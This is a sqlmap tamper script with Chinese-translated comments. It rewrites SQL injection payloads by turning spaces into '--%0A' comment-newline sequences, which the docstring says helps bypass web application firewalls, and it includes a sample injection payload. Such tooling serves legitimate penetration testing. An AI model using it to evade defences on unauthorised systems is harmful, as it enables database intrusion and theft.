#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    "\n    将空格字符 (' ') 替换为破折号注释 ('--')，后跟新行 ('\n')\n\n    Requirement:\n        * MySQL\n        * MSSQL\n\n    Notes:\n        * 可用于绕过多个 Web 应用程序防火墙。\n\n    >>> tamper('1 AND 9227=9227')\n    '1--%0AAND--%0A9227=9227'\n    "

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += "--%0A"
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
